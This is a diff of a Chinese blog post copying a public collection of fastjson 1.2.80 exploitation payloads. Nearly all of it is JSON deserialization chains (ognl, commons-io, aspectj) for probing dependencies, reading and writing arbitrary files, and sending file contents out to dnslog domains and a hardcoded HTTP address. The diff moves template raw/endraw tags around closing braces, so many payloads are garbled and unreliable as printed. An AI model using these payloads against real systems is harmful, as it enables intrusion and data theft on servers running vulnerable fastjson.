@@ -2,17 +2,18 @@
 title: 检测 Java 使用什么 JSON 库的方式
 date: '2026-01-13 17:46:58'
 updated: '2026-01-16 10:59:21'
+abbrlink: 86929b7d
 ---
 <!--more--> 
 原文：[https://github.com/su18/hack-fastjson-1.2.80](https://github.com/su18/hack-fastjson-1.2.80)
 
 # 鉴别 fastjson
 1. DNSLOG  
-`{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}{% endraw %}`  
-`{% raw %}{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}`
+`{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"{% raw %}}}{% endraw %}`  
+`{% raw %}{{{% endraw %}"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}`
 2. 根据解析变化  
 `{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}`  
-`{"ext":"blue","name":{"$ref":"$.ext"}}{% endraw %}`
+`{"ext":"blue","name":{"$ref":"$.ext"{% raw %}}}{% endraw %}`
 3. 根据响应状态  
 `{"@type":"whatever"}`
 
@@ -148,7 +149,7 @@ updated: '2026-01-16 10:59:21'
     "@type": "java.lang.Character"{
   "@type": "java.lang.Class",
   "val": "com.mysql.jdbc.Driver"
-}}{% endraw %}
+{% raw %}}}{% endraw %}
 ```
 
 通过使用 DNSLOG 来探测依赖库
@@ -160,9 +161,9 @@ updated: '2026-01-16 10:59:21'
    "val":{"@type":"com.alibaba.fastjson.JSONObject",{
    "@type": "java.lang.String""@type":"java.util.Locale",
    "language":{"@type":"java.lang.String"
-{1:{"@type":"java.lang.Class","val":"groovy.lang.GroovyShell"}}{% endraw %},
+{1:{"@type":"java.lang.Class","val":"groovy.lang.GroovyShell"{% raw %}}}{% endraw %},
 "country":"gv.su18.dnslog.pw"
-}}{% endraw %}
+{% raw %}}}{% endraw %}
 }
 ```
 
@@ -186,9 +187,9 @@ updated: '2026-01-16 10:59:21'
 文件写，结合 commons-io 代码（stream 里面写 68 的 payload）
 
 ```json
-{"x":[{"@type":"java.lang.Exception","@type":"ognl.OgnlException",},{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}{% endraw %},{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
+{"x":[{"@type":"java.lang.Exception","@type":"ognl.OgnlException",},{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""{% raw %}}}{% endraw %},{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
     }
-}}{% endraw %}]}
+{% raw %}}}{% endraw %}]}
 ```
 
 ## aspectj + ognl 任意文件读取 + DNSLOG 回显  
@@ -224,12 +225,12 @@ updated: '2026-01-16 10:59:21'
 ```json
 {"a":{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
 "fileName":"/Users/su18/Downloads/1.txt"},"b":
-{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale", "val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale", "language":{"@type":"java.lang.String"{"$ref":"$"},"country":"aw.su18.dnslog.pw"}}{% endraw %}}}{% endraw %}}
+{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale", "val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale", "language":{"@type":"java.lang.String"{"$ref":"$"},"country":"aw.su18.dnslog.pw"{% raw %}}}{% endraw %}{% raw %}}}{% endraw %}}
 ```
 
 ## commons-io + ognl + URLReader 单字节文件读取（回显情况观察数值）
 ```json
-{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}{% endraw %},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
+{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""{% raw %}}}{% endraw %},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
 {
       "@type": "org.apache.commons.io.input.BOMInputStream",
       "delegate": {
@@ -242,13 +243,13 @@ updated: '2026-01-16 10:59:21'
         "bufferSize": 1024
       },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
 98]}]
-}}{% endraw %}}}{% endraw %},"su17" : {"$ref":"$.su16.node.p.stream"},"su18":{
-"$ref":"$.su17.bOM.bytes"}}{% endraw %}
+{% raw %}}}{% endraw %}{% raw %}}}{% endraw %},"su17" : {"$ref":"$.su16.node.p.stream"},"su18":{
+"$ref":"$.su17.bOM.bytes"{% raw %}}}{% endraw %}
 ```
 
 ## commons-io + ognl + URLReader 单字节文件读取（报错布尔）
 ```json
-[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}}{% endraw %},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}{% endraw %}},
+[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",{% raw %}}}{% endraw %},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""{% raw %}}}{% endraw %}},
 {"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
 {
       "@type": "org.apache.commons.io.input.BOMInputStream",
@@ -262,14 +263,14 @@ updated: '2026-01-16 10:59:21'
         "bufferSize": 1024
       },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
 98]}]
-}}{% endraw %}}}{% endraw %}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}}{% endraw %},{"su19":{
-"$ref":"$[3].su18.bOM.bytes"}}{% endraw %},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
-              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}{% endraw %}}}{% endraw %}},{"su21" : {"$ref":"$[5].su20.node.p.stream"}}{% endraw %}]
+{% raw %}}}{% endraw %}{% raw %}}}{% endraw %}},{"su18" : {"$ref":"$[2].su17.node.p.stream"{% raw %}}}{% endraw %},{"su19":{
+"$ref":"$[3].su18.bOM.bytes"{% raw %}}}{% endraw %},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
+              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]{% raw %}}}{% endraw %}{% raw %}}}{% endraw %}},{"su21" : {"$ref":"$[5].su20.node.p.stream"{% raw %}}}{% endraw %}]
 ```
 
 ## commons-io + ognl + URLReader 单字节文件读取 HTTPLog 布尔回显（错误的时候有 log，正确时 无 log)
 ```json
-[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",}}{% endraw %},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}{% endraw %}},
+[{"su15":{"@type":"java.lang.Exception","@type":"ognl.OgnlException",{% raw %}}}{% endraw %},{"su16":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""{% raw %}}}{% endraw %}},
 {"su17":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":
 {
       "@type": "org.apache.commons.io.input.BOMInputStream",
@@ -283,9 +284,9 @@ updated: '2026-01-16 10:59:21'
         "bufferSize": 1024
       },"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [
 98]}]
-}}{% endraw %}}}{% endraw %}},{"su18" : {"$ref":"$[2].su17.node.p.stream"}}{% endraw %},{"su19":{
-"$ref":"$[3].su18.bOM.bytes"}}{% endraw %},{"su22":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://120.48.129.28:8080/test?","country":{"@type":"java.lang.String"{"$ref":"98"}}{% endraw %}}}{% endraw %}},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}{% endraw %}}}{% endraw %}},{"su23" : {"$ref":"$[5].su22.node.p.stream"}}{% endraw %},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
-              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}{% endraw %}}}{% endraw %}},{"su21" : {"$ref":"$[7].su20.node.p.stream"}}{% endraw %}]
+{% raw %}}}{% endraw %}{% raw %}}}{% endraw %}},{"su18" : {"$ref":"$[2].su17.node.p.stream"{% raw %}}}{% endraw %},{"su19":{
+"$ref":"$[3].su18.bOM.bytes"{% raw %}}}{% endraw %},{"su22":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://120.48.129.28:8080/test?","country":{"@type":"java.lang.String"{"$ref":"98"{% raw %}}}{% endraw %}{% raw %}}}{% endraw %}},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]{% raw %}}}{% endraw %}{% raw %}}}{% endraw %}},{"su23" : {"$ref":"$[5].su22.node.p.stream"{% raw %}}}{% endraw %},{"su20":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"org.apache.commons.io.input.CharSequenceReader",
+              "charSequence": {"@type": "java.lang.String"{"$ref":"$[4].su19"},"start": 0,"end": 0},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]{% raw %}}}{% endraw %}{% raw %}}}{% endraw %}},{"su21" : {"$ref":"$[7].su20.node.p.stream"{% raw %}}}{% endraw %}]
 ```
 
 ## aspectj 读文件 + Character 报错回显
@@ -293,12 +294,12 @@ updated: '2026-01-16 10:59:21'
 {
 "@type":"java.lang.Character"{"c":{
 "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
-"fileName":"/Users/su18/Downloads/1.txt"}}{% endraw %}
+"fileName":"/Users/su18/Downloads/1.txt"{% raw %}}}{% endraw %}
 ```
 
 ## commons-io + ognl + URLReader + aspectj HTTP Log 回显
 ```json
-{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""}}{% endraw %},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://x.x.x.x:8080/test?","country":{"@type":"java.lang.String"[{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"/Users/su18/Downloads/1.txt"}]}}{% endraw %}}}{% endraw %},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]}}{% endraw %}}}{% endraw %},"su17" : {"$ref":"$.su16.node.p.stream"}}{% endraw %}
+{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{ "@type":"com.alibaba.fastjson.JSONObject",{  "@type":"java.lang.String"  "@type":"ognl.OgnlException",  "_evaluation":""{% raw %}}}{% endraw %},"su16":{   "@type": "ognl.Evaluation",   "node": {       "@type": "ognl.ASTMethod",       "p": {           "@type": "ognl.OgnlParser",           "stream":{     "@type": "org.apache.commons.io.input.BOMInputStream",     "delegate": {       "@type": "org.apache.commons.io.input.ReaderInputStream",       "reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.net.URL","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":"http://x.x.x.x:8080/test?","country":{"@type":"java.lang.String"[{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"/Users/su18/Downloads/1.txt"}]{% raw %}}}{% endraw %}{% raw %}}}{% endraw %},       "charsetName": "UTF-8",       "bufferSize": 1024},"boms": [{"@type": "org.apache.commons.io.ByteOrderMark", "charsetName": "UTF-8", "bytes": [1]}]{% raw %}}}{% endraw %}{% raw %}}}{% endraw %},"su17" : {"$ref":"$.su16.node.p.stream"{% raw %}}}{% endraw %}
 ```
 
 
